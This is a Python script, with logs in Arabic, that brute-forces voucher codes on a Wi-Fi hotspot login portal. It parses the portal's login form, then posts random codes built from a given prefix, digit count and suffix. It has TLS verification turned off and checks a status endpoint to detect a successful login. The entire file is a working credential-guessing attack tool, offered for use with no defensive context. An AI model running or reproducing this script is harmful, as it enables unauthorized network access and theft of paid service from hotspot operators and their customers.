import requests, random, time, traceback

def run(url, network, prefix, suffix, digits, max_attempts, bridge):
    try:
        bridge.appendLog(f"▶ البدء: {url}")
        bridge.appendLog(f"   نمط: {prefix}[{digits} رقم]{suffix}")
        session = requests.Session()
        try:
            r = session.get(url, timeout=15, verify=False)
            bridge.appendLog(f"✓ الاتصال: {r.status_code}")
        except Exception as e:
            bridge.appendLog(f"❌ فشل الاتصال: {e}")
            return

        form = {"username": "", "password": "", "dst": url.rsplit("/", 1)[0] + "/"}
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(r.text, "html.parser")
            f = soup.find("form")
            if f:
                for i in f.find_all("input"):
                    n = i.get("name")
                    if n: form[n] = i.get("value", "")
                bridge.appendLog(f"✓ الحقول: {list(form.keys())}")
        except Exception as e:
            bridge.appendLog(f"⚠ تحذير: {e}")

        max_val = 10**digits - 1
        tried = set()
        found = None
        start = time.time()
        status_url = url.rsplit("/", 1)[0] + "/status?var=callBack"

        for i in range(max_attempts):
            if bridge.isCancelled():
                bridge.appendLog("🛑 إيقاف يدوي")
                break
            num = random.randint(0, max_val)
            v = f"{prefix}{str(num).zfill(digits)}{suffix}"
            if v in tried: continue
            tried.add(v)

            try:
                d = form.copy()
                d["username"] = v
                d["password"] = ""
                session.post(url, data=d, timeout=10, allow_redirects=False, verify=False)
                time.sleep(0.2)
                sr = session.get(status_url, timeout=5, verify=False)
                try: sj = sr.json()
                except: sj = {}
                logged = str(sj.get("logged_in", "")).lower() in ("yes","true","1")
                un = str(sj.get("username", "")).strip()

                if logged and un == v:
                    found = v
                    bridge.appendLog(f"✅ تم إيجاد الكرت: {v}")
                    bridge.appendLog(f"   IP: {sj.get('ip','-')}")
                    bridge.appendLog(f"   Uptime: {sj.get('uptime','-')}")
                    break
                elif logged and not un:
                    found = v
                    bridge.appendLog(f"⚠ مشتبه: {v} (username مخفي)")
                    break

                if i % 5 == 0:
                    el = time.time() - start
                    rt = (i+1)/el if el > 0 else 0
                    bridge.appendLog(f"[{i+1}/{max_attempts}] {v}  {rt:.1f}/s")
            except Exception as e:
                bridge.appendLog(f"⚠ خطأ ({v}): {str(e)[:60]}")
                continue

        if found:
            bridge.appendLog(f"\n🎫 الكرت الصالح: {found}")
        else:
            bridge.appendLog(f"\n❌ لم يُعثر على كرت في {len(tried)} محاولة")

    except Exception as e:
        bridge.appendLog(f"❌ خطأ عام: {e}")
        for l in traceback.format_exc().split("\n"): bridge.appendLog(l)
